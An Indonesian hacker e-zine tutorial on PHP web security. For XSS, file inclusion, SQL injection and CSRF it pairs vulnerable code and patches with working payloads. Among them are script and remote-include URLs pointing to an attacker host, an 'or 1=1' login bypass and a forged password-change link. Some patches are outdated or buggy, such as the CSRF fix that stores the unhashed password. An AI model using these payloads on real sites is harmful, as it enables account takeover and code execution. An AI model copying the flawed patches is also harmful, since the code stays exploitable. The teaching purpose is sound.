@@ -1,0 +1,330 @@
+                 .::                         .:                   
+   .::       .:::.::        .::    .:::: .::   .:: .::     .::    
+ .:   .::  .::   .: .:    .::  .::      .:: .:: .::  .:: .:   .:: 
+.::::: .::.::    .::  .::.::    .::   .::   .:: .::  .::.::::: .::
+.:         .::   .:   .:: .::  .::   .::    .:: .::  .::.:        
+  .::::      .:::.::  .::   .::    .::::::::.::.:::  .::  .::::   
+  
+ECHO MAGAZINE VOLUME VII, ISSUE XXI, PHILE 0x005.TXT
+
+WEB SECURITY YIN-YANG
+Ditulis oleh: gentoo, foobar4joo@gmail.com
+
+===// Pengantar \\===
+
+
+"If you know both yourself and your enemy, you can win a hundred battles 
+ without a single loss."
+
+Di berbagai segi kehidupan, sangatlah di butuhkan keseimbangan. Bahkan yang 
+sangat terkenal adalah  sebuah ungkapan dari Sun Tzu yang saya tuliskan 
+diatas, mengenali kelemahan musuh adalah penting, tetapi lebih penting lagi 
+mengenali kelemahan diri sendiri, karena dengan begitu kita dapat seimbang 
+dalam bertahan dan menyerang.
+
+Saya harap artikel ini nantinya akan dapat menjadi referensi singkat yang 
+membahas tentang menyerang dan bertahan dalam dunia keamanan web (web security), 
+dan artikel ini diharapkan juga bisa menjadi titik mula bagi yang tertarik 
+dengan keamanan web, sekaligus pembuka mata bagi para programmer web agar 
+sedikit banyak mulai menaruh perhatian pada keamanan aplikasi yang meraka buat.
+
+Artikel ini akan membahas beberapa jenis celah keamanan web yang umumnya 
+selalu menjadi primadona dikalangan para pemerhati keamanan web, tetapi 
+bahasan disini bukan mencakup detil tiap celah, tetapi lebih ke arah 
+Proof-of-concept dari cara bertahan dan menyerang. Disajikan dengan 
+menggunakan PHP sebagai bahasa pemrograman "dynamic", HTML, serta mysql 
+sebagai "database engine".  
+
+Formatnya pun akan selalu sama, penyajian kode yang memiliki celah, cara 
+memperkuatnya (bertahan) kemudian diikuti dengan bagaimana metode untuk 
+mengexploitasinya. Jangan berharap artikel ini akan mengajarkan anda dari 
+Nol, bagaimana membuat web, mengkode dengan PHP dan mysql, atau penjelasan 
+detil (pengertian-panjang-lebar) tentang setiap celah. 
+
+Partisipasi aktif andalah yang akan menentukan apakah artikel ini akan 
+bermanfaat buat anda nantinya :) 
+
+===// Yin-Yang \\===
+
+====// XSS Reflected \\====
+
+kode yang memiliki celah untuk di serang:  
+
+--------\\ sweet.php
+	echo 'Selamat Datang' . $_GET['sweet'];
+--------//
+
+Adapun kode untuk melindungi adalah dengan menambahkan fungsi "strip_tags" 
+atau "htmlspecialchars" untuk memeriksa variabel tersebut terlebih dahulu.
+
+--------\\sweet-patch.php
+	echo 'Selamat Datang' . strip_tags($_GET['sweet']);
+atau
+	echo 'Selamat Datang' . htmlspecialchars($_GET['sweet']);
+--------//
+
+------// Eksploitasi \\------
+
+sweet.php?sweet=<script>alert("XSS")</script>
+
+
+====// XSS Persistent \\====
+
+kode yang memiliki celah untuk di serang: 
+
+--------\\ sweet.php
+	$sweet  = trim($_POST['txtSweet']); 
+	$sweet  = mysql_real_escape_string($sweet); 
+	$query  = "INSERT INTO sweet (sweet) VALUES ('$sweet');";
+--------//
+
+Adapun fungsi yang digunakan untuk mengamankannya adalah "stripslashes", 
+"addslashes", "htmlspecialchars"
+
+--------\\sweet-patch.php
+   	$sweet = stripslashes($sweet);
+  	$sweet = mysql_real_escape_string($sweet);
+   	$sweet = htmlspecialchars($sweet); 
+   
+  	$query = "INSERT INTO sweet (sweet) VALUES ('$sweet');";
+--------//
+   
+------// Eksploitasi \\------
+
+sweet.php?sweet=<SCRIPT SRC=http://dare.dev.il/evil.js?<B>
+
+Bedanya, xss exploit ini akan tersimpan ke database dan akan selalu di 
+eksekusi setiap halaman sweet.php di load, selanjutnya tinggal keahlian 
+anda berkreasi pada script evil.js
+      
+
+====// File Inclusion \\====
+
+Kode yang memiliki celah untuk di serang:
+
+--------\\berkas.php
+    	$file = $_GET['halaman'];   
+--------//
+
+Adapun Untuk mengamankan berkas.php, cukup dengan mendefinisikan file yang 
+ingin kita include secara pasti.
+
+--------\\berkas-patch.php        
+    	$file = $_GET['halaman']; 
+
+    	// hanya mengijinkan sweet.php
+    	if ( $file != "sweet.php" ) {
+        	echo "ERROR: File not found!";
+        	exit;
+    	}
+--------//
+
+|------
+| Atau untuk melengkapinya, silahkan melakukan serring "Off" pada Directive 
+| 	allow_url_fopen	
+| 	allow_url_include
+| pada php.ini
+|------
+   
+------// Eksploitasi \\------
+
+berkas.php?halaman=http://dare.dev.il/evil.php
+
+Selanjutnya tergantung keahlian anda berkreasi pada script evil.php, agar 
+berbagai perintah dalam evil.php dapat tereksekusi, ada beberapa syarat lain 
+yang harus dipenuhi, dan ini menjadi PR anda untuk mencari tahu.
+ 
+
+====// SQL Injection \\====
+
+SQL injection adalah salah satu teknik yang cukup tua untuk dibahas, celah 
+ini pada web aplikasilah yang paling banyak memberikan andil kepada 
+terkuasainya banyak webserver. Celah ini bisa saya bilang multiplatform
+karena bisa Database dapat berpasangan dengan bahasa permrograman apapun 
+dan berjalan di sistem-operasi apapun.
+
+Untuk teknik ini saya tidak ingin panjang lebar, tetapi khusus untuk celah 
+lawas ini, kode yang akan saya berikan lengkap, dan bagi para pencinta 
+"salin & tempel" akan dnegan mudah dapat mengapliaksikannya, hmm
+sepertinya tidak juga, karena setidaknya kamu harus paham database, 
+membuat tabel dan mengkoneksikannyadengan php :)
+
+Ok, berikut adalah kode yang telah memiliki tempat sendiri dalam sejarah 
+keamanan aplikasi web :lol: 
+
+
+--------//vulnlogin.php
+<table>
+<form name="member" method="post" action="#">
+<tr><td colspan="2"><b>Member Login</b></tr>
+<tr>
+<td>Username</td>
+<td><input type="text" name="username" value="" size="40">
+</tr>
+
+<tr>
+<td>Password</td>
+<td><input type="password" name="password" value="" size="40">
+</tr>
+
+<tr><td colspan="2">
+<input type="submit" name="submit" value="Submit">
+<input type="reset" name="reset" value="Reset">
+</td></form>
+</table>
+
+		
+<?php
+include 'config.php'; // ini adalah konfigurasi koneksi aplikasi ke database, 
+ga bisa buat? :lol:
+
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$q = "SELECT username, password FROM member WHERE username = '$username' AND \
+password = '$password' ";
+
+$r = mysql_query($q);
+if (!$r) {
+	print mysql_error();
+} else {
+	$row = mysql_fetch_row($r);
+	if (($row[0] != "") && ($row[1] != "")) {
+		echo "&nbsp;&nbsp;<a href=somerandompagesnameforyou.php>Yeah, you are in!</a>";
+	} else {
+		echo"<pre> &nbsp;&nbsp;You need to register as a member to login! </pre>";
+	}
+}
+
+?>
+--------//	
+
+dan untuk mengamankannya adalah dengan melakukan filtering pada kedua 
+variabel "username" dan "password"
+
+$username = stripslashes($username);
+$username = mysql_escape_string($username);
+$password = stripslashes($password);
+$password = mysql_real_escape_string($password); 
+
+|----
+| Untuk memperkuatnya, seandainya ada yang terlewat, melakukan setting 
+| "On" untuk 
+|	magic_quotes_gpc 
+| pada setting PHP.ini
+|----
+
+------// Eksploitasi \\------
+
+Masukkan 'or '1=1'' (l33t)  pada input box username/password untuk membypass 
+login, sehingga rikues akan jadi seperti ini
+
+|----
+| SELECT username, password FROM member WHERE username = ''or'1=1''' AND password = ''or'1=1'''
+|---
+
+Selanjutnya, anda simpulkan sendiri :) 
+
+===// Cross Site Requesr Forgery \\===
+
+Kode berikut adalah mempertunjukkan sebuah halaman ganti password untuk admin, 
+yang tidak melakukan pemeriksaan password saat ini, sehingga memungkinkan 
+celah CSRF digunakan.
+
+--------\\ganti.php
+<?php
+                
+    if (isset($_GET['ganti'])) {
+        $pwd_baru = $_GET['pwd_baru'];
+        $pwd_baru2 = $_GET['pwd_baru2'];
+
+
+        if (($pwd_baru == $pwd_baru2)){
+            $pwd_baru = mysql_real_escape_string($pwd_baru);
+            $pwd_baru = md5($pwd_baru);
+
+            $insert="UPDATE `users` SET pwd = '$pwd_baru' WHERE user = 'admin';";
+            $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );
+                        
+            echo "<pre>Password Admin Berubah </pre>";        
+            mysql_close();
+        }
+        else{        
+            echo "<pre> Password tidak cocok. </pre>";            
+        }
+
+    }
+?>
+--------//
+
+Adapun untuk memperbaikinya adalah, dengan melakukan pemeriksaan password saat 
+ini terlebih dahulu sebelum merubah password
+
+--------\\ganti-patch.php
+<?php
+            
+    if (isset($_GET['ganti'])) {
+        $pwd = $_GET['pwd'];
+        $pwd_baru = $_GET['pwd_baru'];
+        $pwd_baru2 = $_GET['pwd_baru2'];
+
+        $pwd = stripslashes( $pwd );
+        $pwd = mysql_real_escape_string( $pwd );
+        $pwd = md5( $pwd );
+        
+        // Periksa password saat ini (pwd)
+        $qry = "SELECT pwd FROM `users` WHERE user='admin' AND pwd='$pwd';";
+        $result = mysql_query($qry) or die('<pre>' . mysql_error() . '</pre>' );
+
+        if (($pwd_baru == $pwd_baru2) && ( $result && mysql_num_rows( $result ) == 1 )){
+            $pwd_baru = mysql_real_escape_string($pwd_baru);
+            $pass_new = md5($pwd_baru);
+
+            $insert="UPDATE `users` SET pwd = '$pwd_baru' WHERE user = 'admin';";
+            $result=mysql_query($insert) or die('<pre>' . mysql_error() . '</pre>' );
+                        
+            echo "<pre> Password Admin Berubah </pre>";        
+            mysql_close();
+        }
+    
+        else{        
+            echo "<pre> Passwords Baru tidak cocok atau password lama anda salah. </pre>";            
+        }
+
+    }
+?>
+---------//
+
+------// Eksploitasi \\------
+
+Adapun cara eksploitasinya adalah melibatkan kelalaian sang admin, umumnya 
+attacker akan mengirim link tersbut ke email, atau melalui forum dsb dengan 
+harapan sang admin akan meng-click-nya.
+
+<a href=http://nice.ang.el/ganti.php?pwd=&pwd_baru=dudul&pwd_baru2=dudul&ganti=ganti#>klik saya</a>
+
+===// Penutup \\===
+
+Oke, saya harap anda semua yang membaca akan pusing, dan disinilah orang-orang 
+terpilih akan mengikis pembaca lainnya, yup, dengan cepat anda akan segera 
+mencoba dan mencari tahu apa yang saya tulis disini,
+
+google! sejak awal di luncurkan adalah referensi terbaik.
+
+Pelajari berbagai fungsi-fungsi yang saya singgung diatas, secara pelan dan 
+jangan terburu-buru :), selebihnya selamat datang di dunia web aplikasi yang '
+penuh dengan intrik-intrik, dan semoga sedikit dari saya dapat
+bermanfaat untuk semua. Logika anda sangat di perlukan disini!
+
+===// Reference \\===
+
+[1].google.inc, http://google.com
+[2].OWASP, "The Open Web Application Security Project", http://owasp.org
+[3].semua web aplikasi yang telah saya lihat kode php-nya 
+
+
+===// Greetz \\===
+
+~ jck.mrshl, "stay away from light!"
+~ ind0nesian Undergr0und Community
+~ k-159, y3dips, and all echo-staff
